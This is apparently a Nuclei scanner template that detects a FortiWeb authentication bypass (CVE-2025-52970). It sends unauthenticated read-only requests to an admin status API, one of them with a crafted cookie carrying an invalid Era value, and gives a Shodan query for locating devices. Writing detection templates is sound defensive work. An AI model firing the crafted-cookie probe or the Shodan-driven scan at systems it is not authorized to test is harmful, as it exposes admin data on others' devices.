id: fortinet-fortiweb-cve-2025-52970-auth-bypass

info:
  name: Fortinet FortiWeb Auth Bypass (CVE-2025-52970) â€“ admin status JSON exposed
  author: yourhandle
  severity: high
  description: |
    Detects unauthenticated access to the admin-only status API on FortiWeb
    indicative of CVE-2025-52970 ("FortMajeure"). The first request tests for
    exposure without credentials. The second request adds a minimal cookie with
    an invalid Era value (Era=9) that exercises the broken parameter handling
    described by the researcher. Both requests are strictly read-only.
  reference:
    - https://github.com/projectdiscovery/nuclei-templates/issues/13123
    - https://pwner.gg/blog/2025-08-13-fortiweb-cve-2025-52970
    - https://fortiguard.fortinet.com/psirt/FG-IR-25-448
  metadata:
    cve: CVE-2025-52970
    product: Fortinet FortiWeb
    shodan-query: 'ssl:"cn=fortiweb" port:8443'
    verified: false
  tags: cve,fortinet,fortiweb,auth-bypass,exposure

http:
  # Probe 1: direct, unauthenticated call to the admin-only status endpoint
  - method: GET
    path:
      - "{{BaseURL}}/api/v2.0/system/status.systemstatus"
    headers:
      Accept: application/json
    max-redirects: 1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          # Keys observed in the researcher's PoC response body
          - '"firmwareVersion":'
          - '"haStatus":'
          - '"readonly":'
    extractors:
      - type: json
        name: firmware
        json:
          - ".results.firmwareVersion"
    stop-at-first-match: true

  # Probe 2: repeat with a minimal cookie that sets an out-of-range Era=9.
  # NOTE: This is benign: it does not attempt brute force, encryption, or any write.
  - method: GET
    path:
      - "{{BaseURL}}/api/v2.0/system/status.systemstatus"
    headers:
      Accept: application/json
      # Invalid / out-of-range Era value per write-up; dummy placeholders for other parts.
      Cookie: APSCOOKIE_FWEB_{{rand_int(6)}}=Era=9&Payload={{base64("x")}}&AuthHash={{base64("x")}}
    max-redirects: 1
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - '"firmwareVersion":'
          - '"haStatus":'
          - '"readonly":'
